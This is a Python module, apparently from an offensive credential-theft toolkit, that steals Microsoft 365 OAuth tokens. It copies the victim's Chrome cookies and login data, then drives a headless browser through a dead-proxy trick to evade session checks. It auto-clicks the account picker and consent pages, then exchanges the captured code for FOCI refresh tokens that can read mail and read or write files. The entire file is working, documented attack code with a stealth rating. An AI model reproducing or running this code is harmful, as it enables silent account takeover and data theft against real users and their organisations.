"""Microsoft 365 OAuth hijack via headless Chrome with copied user profile.

Leverages the user's existing Chrome session to silently authorize an OAuth
grant using a FOCI (Family of Client IDs) client.  Zero external dependencies
— uses the system Chrome binary and Python stdlib only.

Microsoft does NOT aggressively revoke copied profile sessions the way Google
does, making this technique more reliable than the Google equivalent.

Flow:
  1. Copy minimal Chrome profile to temp dir (cookies + state)
  2. Patch Preferences to suppress restore dialogs
  3. Start a localhost HTTP server to capture the OAuth redirect
  4. Build OAuth URL with FOCI client_id (Microsoft Office)
  5. Launch Chrome with copied profile → OAuth consent URL
  6. CDP auto-clicks through Microsoft consent flow
  7. Capture the auth code from the redirect
  8. Exchange auth code for refresh_token + access_token (no client_secret needed)
  9. Extract tenant_id from JWT
 10. Clean up temp profile
"""

from __future__ import annotations

import base64
import http.server
import json
import os
import shutil
import socket
import subprocess
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import List, Optional

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import (
    chrome_user_data_dir,
    get_platform,
)

# FOCI client — Microsoft Office, works for all M365 services without
# client_secret (public client).  A refresh token from this client can be
# exchanged for tokens to ANY other FOCI app (Teams, Outlook, OneDrive, etc.)
FOCI_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"

# Scopes: offline_access for refresh token, openid+profile for identity,
# plus a useful baseline of Graph API permissions.
MS_SCOPES = [
    "offline_access",
    "openid",
    "profile",
    "User.Read",
    "Mail.Read",
    "Files.ReadWrite.All",
]

TOKEN_ENDPOINT = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
AUTHORIZE_ENDPOINT = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"

# Domains that must bypass the dead proxy during the OAuth consent flow.
# Missing any of these causes chrome-error://chromewebdata/ navigation failures.
# Keep sorted by category for easy auditing.
MS_AUTH_BYPASS_DOMAINS: tuple[str, ...] = (
    # --- Primary login endpoints ---
    "login.microsoftonline.com",
    "login.microsoft.com",
    "login.live.com",
    "login.windows.net",                       # legacy login endpoint
    "sts.windows.net",                         # STS endpoint
    "device.login.microsoftonline.com",        # device auth flow
    "stamp2.login.microsoftonline.com",        # stamp-specific login
    "autologon.microsoftazuread-sso.com",      # seamless SSO
    "content.microsoftonline.com",             # content delivery
    # --- Auth CDN / static assets ---
    "aadcdn.msftauth.net",
    "aadcdn.msauth.net",
    "logincdn.msftauth.net",
    "lgincdn.msauth.net",
    "msftauth.net",
    "msauth.net",
    "aadcdn.msftauthimages.net",               # CDN for auth page assets
    "aadcdn.msauthimages.net",
    "ajax.aspnetcdn.com",                      # Microsoft CDN for JS
    # --- Wildcard patterns ---
    "*.microsoft.com",
    "*.live.com",
    "*.microsoftonline.com",
    "*.microsoftonline-p.com",                 # alternate login endpoint
    "*.msftauth.net",
    "*.msauth.net",
    "*.msftauthimages.net",                    # auth page images
    "*.msauthimages.net",                      # auth page images
    # --- Localhost (redirect capture) ---
    "localhost",
    "127.0.0.1",
)

# Files to copy from Chrome profile — enough for session cookies + login state
PROFILE_FILES = [
    "Local State",
    # Cookies (including WAL and journal)
    "Default/Cookies",
    "Default/Cookies-journal",
    "Default/Cookies-wal",
    "Default/Network/Cookies",
    "Default/Network/Cookies-journal",
    "Default/Network/Cookies-wal",
    # Login state (saved credentials, session tokens)
    "Default/Login Data",
    "Default/Login Data-journal",
    "Default/Login Data-wal",
    "Default/Login Data For Account",
    "Default/Login Data For Account-journal",
    "Default/Web Data",
    "Default/Web Data-journal",
    # Chrome config
    "Default/Preferences",
    "Default/Secure Preferences",
    # Extension cookies (some auth flows use these)
    "Default/Extension Cookies",
    "Default/Extension Cookies-journal",
]

# Directories to copy (shallow — session state)
PROFILE_DIRS = [
    "Default/Session Storage",
    "Default/Sessions",
]


def _find_chrome() -> Optional[str]:
    """Find the Chrome binary on the current platform."""
    plat = get_platform()
    candidates = []

    if plat == "macos":
        candidates = [
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
            "/Applications/Chromium.app/Contents/MacOS/Chromium",
            os.path.expanduser(
                "~/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
            ),
        ]
    elif plat == "windows":
        for env_var in ("PROGRAMFILES", "PROGRAMFILES(X86)", "LOCALAPPDATA"):
            base = os.environ.get(env_var, "")
            if base:
                candidates.append(
                    os.path.join(base, "Google", "Chrome", "Application", "chrome.exe")
                )
    else:  # Linux
        candidates = [
            "/usr/bin/google-chrome",
            "/usr/bin/google-chrome-stable",
            "/usr/bin/chromium-browser",
            "/usr/bin/chromium",
            "/snap/bin/chromium",
        ]

    for path in candidates:
        if os.path.isfile(path):
            return path

    # Fallback: try PATH
    for name in ("google-chrome", "google-chrome-stable", "chromium", "chrome"):
        result = shutil.which(name)
        if result:
            return result

    return None


def _find_free_port() -> int:
    """Find a free TCP port on localhost."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


class _AuthCodeHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that captures the OAuth redirect and extracts the auth code."""

    auth_code: Optional[str] = None
    error: Optional[str] = None

    def do_GET(self):  # noqa: N802
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)

        if "code" in params:
            _AuthCodeHandler.auth_code = params["code"][0]
            self._respond(
                "<html><body><h2>&#10003; Token captured</h2>"
                "<p>You can close this tab. NinLoader has your token.</p>"
                "</body></html>"
            )
        elif "error" in params:
            _AuthCodeHandler.error = params.get("error", ["unknown"])[0]
            desc = params.get("error_description", [""])[0]
            self._respond(
                f"<html><body><h2>OAuth error: {_AuthCodeHandler.error}</h2>"
                f"<p>{desc}</p></body></html>"
            )
        else:
            self._respond("<html><body>Waiting for OAuth redirect...</body></html>")

    def _respond(self, html: str):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())

    def log_message(self, format, *args):  # noqa: A002
        pass  # Silence HTTP logs


@CollectorRegistry.register
class MicrosoftBrowserHijackCollector(BaseCollector):
    """Steal Microsoft 365 OAuth tokens via headless Chrome profile hijack.

    Uses the FOCI client_id (Microsoft Office) so the refresh token can be
    exchanged for tokens to Teams, Outlook, OneDrive, Azure CLI, etc.
    """

    service = "microsoft"
    source = "browser_hijack"
    stealth_score = 4

    def _copy_profile(self) -> Optional[str]:
        """Copy Chrome profile files to a temp directory."""
        chrome_dir = chrome_user_data_dir()
        if not chrome_dir.exists():
            return None

        temp_dir = tempfile.mkdtemp(prefix="ninloader_ms_chrome_")

        # Copy individual files
        for rel_path in PROFILE_FILES:
            src = chrome_dir / rel_path
            dst = Path(temp_dir) / rel_path
            if src.exists():
                dst.parent.mkdir(parents=True, exist_ok=True)
                try:
                    shutil.copy2(str(src), str(dst))
                except (PermissionError, OSError):
                    continue

        # Copy directories (session state)
        for rel_dir in PROFILE_DIRS:
            src = chrome_dir / rel_dir
            dst = Path(temp_dir) / rel_dir
            if src.exists() and src.is_dir():
                try:
                    shutil.copytree(str(src), str(dst), dirs_exist_ok=True)
                except (PermissionError, OSError):
                    continue

        # Chrome needs a First Run sentinel to skip setup wizard
        (Path(temp_dir) / "First Run").touch()

        # Patch Preferences to avoid "Restore pages" dialog
        prefs_path = Path(temp_dir) / "Default" / "Preferences"
        if prefs_path.exists():
            try:
                prefs = json.loads(prefs_path.read_text())
                prefs.setdefault("profile", {})["exit_type"] = "Normal"
                prefs.setdefault("profile", {})["exited_cleanly"] = True
                # Disable session restore
                prefs.setdefault("session", {})["restore_on_startup"] = 4
                prefs_path.write_text(json.dumps(prefs))
            except (json.JSONDecodeError, OSError):
                pass

        return temp_dir

    def discover(self) -> List[DiscoveredToken]:
        results = []

        chrome = _find_chrome()
        chrome_dir = chrome_user_data_dir()
        has_cookies = (
            (chrome_dir / "Default" / "Cookies").exists()
            or (chrome_dir / "Default" / "Network" / "Cookies").exists()
        )

        if chrome and has_cookies:
            details = (
                f"Chrome + FOCI client (Microsoft Office) — "
                f"headless OAuth hijack (client_id={FOCI_CLIENT_ID[:20]}...)"
            )
            results.append(
                DiscoveredToken(
                    service=self.service,
                    source=self.source,
                    path=str(chrome_dir),
                    account_hint="active Chrome Microsoft session",
                    stealth_score=self.stealth_score,
                    details=details,
                )
            )
        else:
            missing = []
            if not chrome:
                missing.append("Chrome binary")
            if not has_cookies:
                missing.append("Chrome cookies")
            if missing:
                results.append(
                    DiscoveredToken(
                        service=self.service,
                        source=self.source,
                        path="",
                        account_hint="",
                        stealth_score=self.stealth_score,
                        details=f"missing: {', '.join(missing)}",
                    )
                )

        return results

    def collect(self) -> List[CollectedToken]:
        results = []

        # Preflight checks
        chrome = _find_chrome()
        if not chrome:
            self._warn("Chrome binary not found")
            return results

        # 1. Copy Chrome profile
        self._info("Copying Chrome profile...")
        temp_dir = self._copy_profile()
        if not temp_dir:
            self._warn("Failed to copy Chrome profile")
            return results

        try:
            # 2. Start localhost capture server
            port = _find_free_port()
            redirect_uri = f"http://localhost:{port}"

            server = http.server.HTTPServer(
                ("127.0.0.1", port), _AuthCodeHandler
            )
            server.timeout = 25

            # Handle multiple requests (Microsoft may do preflight/favicon)
            def serve():
                for _ in range(5):
                    server.handle_request()
                    if _AuthCodeHandler.auth_code or _AuthCodeHandler.error:
                        break

            server_thread = threading.Thread(target=serve, daemon=True)
            server_thread.start()

            # 3. Build OAuth URL
            scope = " ".join(MS_SCOPES)
            oauth_params = urllib.parse.urlencode(
                {
                    "client_id": FOCI_CLIENT_ID,
                    "redirect_uri": redirect_uri,
                    "response_type": "code",
                    "scope": scope,
                    "prompt": "consent",
                },
                quote_via=urllib.parse.quote,
            )
            oauth_url = f"{AUTHORIZE_ENDPOINT}?{oauth_params}"

            # 4. Launch Chrome with copied profile + remote debugging
            debug_port = _find_free_port()
            # Dead proxy trick: route ALL traffic through a dead SOCKS proxy
            # EXCEPT for the Microsoft login endpoints and localhost.
            # This prevents Chrome from contacting any validation/telemetry
            # endpoints that could flag the copied session.
            self._info("Launching Chrome with CDP debugging...")
            chrome_args = [
                chrome,
                f"--user-data-dir={temp_dir}",
                f"--remote-debugging-port={debug_port}",
                "--no-first-run",
                "--no-default-browser-check",
                "--disable-extensions",
                "--disable-background-networking",
                "--disable-sync",
                "--disable-translate",
                "--disable-component-update",
                "--disable-domain-reliability",
                "--disable-client-side-phishing-detection",
                "--disable-features=MediaRouter,AccountConsistency,"
                "DiceFixAuthErrors,MirrorAccountConsistency",
                # Dead proxy blocks ALL traffic except bypassed hosts.
                # Microsoft OAuth redirects through many domains during the
                # consent flow — missing any causes chrome-error://chromewebdata/
                "--proxy-server=socks5://127.0.0.1:1",
                f"--proxy-bypass-list={','.join(MS_AUTH_BYPASS_DOMAINS)}",
                "--window-size=1280,800",
                oauth_url,
            ]

            proc = subprocess.Popen(
                chrome_args,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            # 5. Connect CDP and auto-click through Microsoft consent flow
            from ...core.cdp import CDPClient, CDPError

            self._info(f"Connecting CDP on port {debug_port}...")
            cdp = CDPClient(debug_port, timeout=15)
            try:
                time.sleep(1.5)  # Minimal Chrome startup wait
                cdp.connect("login.microsoftonline.com")
                cdp.send("Page.enable")
                self._info("CDP connected - auto-clicking consent flow...")

                # Auto-click loop: handle account picker -> consent -> accept
                for attempt in range(12):
                    time.sleep(1.5)
                    url = cdp.get_url()

                    # Already redirected to localhost? Done!
                    if f"localhost:{port}" in url:
                        self._info("  Redirect captured!")
                        break

                    # Chrome navigation error — dead proxy blocked a required domain
                    if url.startswith("chrome-error://"):
                        blocked = self._detect_blocked_domain(cdp)
                        if blocked:
                            self._warn(
                                f"Dead proxy blocked domain: {blocked} — "
                                f"add it to MS_AUTH_BYPASS_DOMAINS"
                            )
                        else:
                            self._warn(
                                "Chrome hit a navigation error (chrome-error://chromewebdata/). "
                                "A required Microsoft auth domain is likely missing from the "
                                "proxy bypass list."
                            )
                        break

                    page_text = cdp.evaluate("document.body.innerText") or ""
                    self._info(f"  [{attempt+1}] URL: ...{url[-60:]}")

                    # Step 1: Account picker — click the target email/account
                    # Microsoft shows a "Pick an account" page with account tiles.
                    # Elements may have data-test-id, role="button", or
                    # data-email attributes.
                    if "pick an account" in page_text.lower() or "choose an account" in page_text.lower():
                        # Try clicking by data-email attribute first (most reliable)
                        clicked = cdp.evaluate(
                            "(function() {"
                            "  var el = document.querySelector('[data-email]');"
                            "  if (el) { el.click(); return true; }"
                            "  return false;"
                            "})()"
                        )
                        if not clicked:
                            # Try common account tile selectors
                            clicked = cdp.click(
                                "div[data-test-id='table'] div[role='button'],"
                                "div.table div[role='link'],"
                                "li.AccountItem,"
                                "div.tile[data-bind],"
                                "div[data-test-id] small"
                            )
                        if not clicked:
                            # Fallback: click any element with an email pattern
                            clicked = cdp.evaluate(
                                "(function() {"
                                "  var els = document.querySelectorAll("
                                "    'div[role=button],div[role=link],li,small,"
                                "    div.table-row,div.row'"
                                "  );"
                                "  for (var i = 0; i < els.length; i++) {"
                                "    if (els[i].textContent.match(/@/)) {"
                                "      els[i].click(); return true;"
                                "    }"
                                "  }"
                                "  return false;"
                                "})()"
                            )
                        if clicked:
                            self._info("  Clicked account in picker")
                            continue

                    # Step 2: Password page — we rely on the session cookie,
                    # but if MSFT asks for password we can't auto-fill it.
                    # Detect by the presence of a password input field, not just
                    # the word "password" in page text (which can appear in
                    # other contexts like consent scope descriptions).
                    has_password_input = cdp.evaluate(
                        "!!document.querySelector("
                        "  'input[type=password]:not([aria-hidden=true])'"
                        ")"
                    )
                    if has_password_input or "enter password" in page_text.lower():
                        # Check if there's a "Use a different account" or similar
                        # that might let us use a passwordless flow
                        if "sign in another way" in page_text.lower():
                            cdp.click_by_text("Sign in another way")
                            self._info("  Clicked 'Sign in another way'")
                            continue
                        # If only password field, session cookie wasn't enough
                        self._warn(
                            "Microsoft requires password — session cookie insufficient. "
                            "The user may need to re-authenticate in their browser first."
                        )
                        break

                    # Step 3: "Stay signed in?" / KMSI page
                    if "stay signed in" in page_text.lower():
                        clicked = (
                            cdp.click_by_text("Yes")
                            or cdp.click("#idSIButton9")
                            or cdp.click_by_text("No")
                            or cdp.click("#idBtn_Back")
                            or cdp.click("input[type=submit]")
                        )
                        if clicked:
                            self._info("  Clicked 'Yes' on KMSI page")
                            continue

                    # Step 4: Consent/permissions page — click "Accept"
                    if "permissions requested" in page_text.lower() or "accept" in page_text.lower():
                        clicked = (
                            cdp.click("#idBtn_Accept")
                            or cdp.click("input[value='Accept']")
                            or cdp.click_by_text("Accept")
                            or cdp.click("input[type=submit]")
                        )
                        if clicked:
                            self._info("  Clicked Accept on consent page")
                            continue

                    # Step 5: "Yes" button (generic confirmation)
                    if "yes" in page_text.lower().split():
                        clicked = (
                            cdp.click("#idSIButton9")
                            or cdp.click_by_text("Yes")
                        )
                        if clicked:
                            self._info("  Clicked Yes")
                            continue

                    # Step 6: "Next" button (multi-step flow)
                    if "next" in page_text.lower().split():
                        clicked = (
                            cdp.click("#idSIButton9")
                            or cdp.click_by_text("Next")
                            or cdp.click("input[type=submit]")
                        )
                        if clicked:
                            self._info("  Clicked Next")
                            continue

                    # Fallback: try any submit button
                    cdp.click("input[type=submit],button[type=submit]")

            except CDPError as e:
                self._warn(f"CDP error: {e}")
            finally:
                cdp.close()

            # 6. Wait for redirect to capture server
            self._info(f"Waiting for OAuth redirect on port {port}...")
            deadline = time.time() + 15
            while (
                time.time() < deadline
                and _AuthCodeHandler.auth_code is None
                and _AuthCodeHandler.error is None
            ):
                time.sleep(0.5)

            # Terminate Chrome
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except (subprocess.TimeoutExpired, OSError):
                proc.kill()

            server.server_close()

            # 7. Check result
            if _AuthCodeHandler.error:
                self._warn(f"OAuth error: {_AuthCodeHandler.error}")
                return results

            if not _AuthCodeHandler.auth_code:
                self._warn(
                    "Timed out waiting for OAuth redirect. "
                    "The user may not have an active Microsoft session in Chrome, "
                    "or the consent flow requires interaction."
                )
                return results

            auth_code = _AuthCodeHandler.auth_code
            self._info("Auth code captured! Exchanging for tokens...")

            # Reset class-level state for next run
            _AuthCodeHandler.auth_code = None
            _AuthCodeHandler.error = None

            # 8. Exchange auth code for tokens
            # FOCI clients are public — no client_secret needed
            token_data = self._exchange_code(auth_code, redirect_uri)
            if not token_data:
                return results

            # 9. Extract identity from id_token JWT
            email = None
            tenant_id = None
            display_name = None
            oid = None
            id_token = token_data.get("id_token", "")
            if id_token:
                claims = self._decode_jwt_claims(id_token)
                if claims:
                    email = claims.get("preferred_username") or claims.get("email") or claims.get("upn")
                    tenant_id = claims.get("tid")
                    display_name = claims.get("name")
                    oid = claims.get("oid")

            results.append(
                CollectedToken(
                    service=self.service,
                    source=self.source,
                    stealth_score=self.stealth_score,
                    account_id=oid or email,
                    username=email,
                    display_name=display_name,
                    tenant_id=tenant_id,
                    access_token=secure(token_data.get("access_token", "")),
                    refresh_token=secure(token_data.get("refresh_token", "")),
                    client_id=FOCI_CLIENT_ID,
                    token_uri=TOKEN_ENDPOINT,
                    scopes=token_data.get("scope", "").split() if isinstance(token_data.get("scope"), str) else token_data.get("scope", []),
                    foci=True,
                    extra={
                        "grant_type": "browser_hijack",
                        "id_token_present": bool(id_token),
                        "foci_family": "1",
                    },
                )
            )

            self._info(
                f"SUCCESS - Microsoft FOCI refresh token obtained for {email or 'unknown user'}"
                + (f" (tenant: {tenant_id})" if tenant_id else "")
            )

        finally:
            # 10. Clean up temp profile
            shutil.rmtree(temp_dir, ignore_errors=True)

        return results

    @staticmethod
    def _detect_blocked_domain(cdp: "CDPClient") -> Optional[str]:
        """Use performance.getEntries() via CDP to find which domain the proxy blocked.

        When Chrome hits a dead proxy for a non-bypassed domain, the failed
        navigation URL appears in the performance timeline.  We extract it so
        operators know exactly which domain to add to MS_AUTH_BYPASS_DOMAINS.
        """
        try:
            # performance.getEntries() returns all resource timing entries
            # including the failed navigation.  We look for the last
            # 'navigation' entry whose name is a URL (not chrome-error://).
            entries = cdp.evaluate(
                "(function() {"
                "  var entries = performance.getEntries();"
                "  var urls = [];"
                "  for (var i = 0; i < entries.length; i++) {"
                "    var e = entries[i];"
                "    if (e.name && e.name.startsWith('http')) {"
                "      urls.push(e.name);"
                "    }"
                "  }"
                "  return urls;"
                "})()"
            )
            if entries:
                # The last http(s) entry is typically the blocked navigation
                last_url = entries[-1] if isinstance(entries, list) else None
                if last_url and isinstance(last_url, str):
                    # Extract the hostname
                    parsed = urllib.parse.urlparse(last_url)
                    return parsed.hostname or last_url
        except Exception:
            pass
        return None

    def _exchange_code(self, code: str, redirect_uri: str) -> Optional[dict]:
        """Exchange authorization code for access + refresh tokens.

        FOCI clients are public (no client_secret required).
        """
        data = urllib.parse.urlencode(
            {
                "code": code,
                "client_id": FOCI_CLIENT_ID,
                "redirect_uri": redirect_uri,
                "grant_type": "authorization_code",
                "scope": " ".join(MS_SCOPES),
            }
        ).encode()

        req = urllib.request.Request(
            TOKEN_ENDPOINT,
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                return json.loads(resp.read().decode())
        except urllib.error.URLError as e:
            self._warn(f"Token exchange failed: {e}")
            return None

    @staticmethod
    def _decode_jwt_claims(token: str) -> Optional[dict]:
        """Extract claims from a JWT without signature verification."""
        parts = token.split(".")
        if len(parts) < 2:
            return None
        try:
            # Fix padding
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            return payload
        except Exception:
            return None

    def refresh(self, token: CollectedToken) -> "RefreshResult":
        """Refresh a Microsoft FOCI token using the refresh_token."""
        from ...types import RefreshResult

        if not token.refresh_token:
            return RefreshResult(
                success=False,
                service=self.service,
                source=self.source,
                error="No refresh token available",
            )

        client_id = token.client_id or FOCI_CLIENT_ID
        tenant_id = token.tenant_id or "common"
        token_uri = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"

        data = urllib.parse.urlencode(
            {
                "client_id": client_id,
                "refresh_token": token.refresh_token.value,
                "grant_type": "refresh_token",
                "scope": " ".join(MS_SCOPES),
            }
        ).encode()

        req = urllib.request.Request(
            token_uri,
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                result = json.loads(resp.read().decode())
        except urllib.error.URLError as e:
            return RefreshResult(
                success=False,
                service=self.service,
                source=self.source,
                error=f"Refresh request failed: {e}",
            )

        if "access_token" not in result:
            return RefreshResult(
                success=False,
                service=self.service,
                source=self.source,
                error=result.get("error_description", result.get("error", "Refresh failed")),
            )

        # Extract identity from new id_token
        claims = {}
        if result.get("id_token"):
            claims = self._decode_jwt_claims(result["id_token"]) or {}

        new_token = CollectedToken(
            service=self.service,
            source=self.source,
            stealth_score=self.stealth_score,
            account_id=claims.get("oid") or token.account_id,
            username=claims.get("preferred_username") or token.username,
            display_name=claims.get("name") or token.display_name,
            tenant_id=claims.get("tid") or tenant_id,
            access_token=secure(result["access_token"]),
            refresh_token=secure(result.get("refresh_token", token.refresh_token.value)),
            client_id=client_id,
            token_uri=token_uri,
            scopes=result.get("scope", "").split() if isinstance(result.get("scope"), str) else result.get("scope", []),
            foci=True,
            extra={
                "grant_type": "browser_hijack",
                "foci_family": "1",
            },
        )

        return RefreshResult(
            success=True,
            service=self.service,
            source=self.source,
            new_token=new_token,
        )
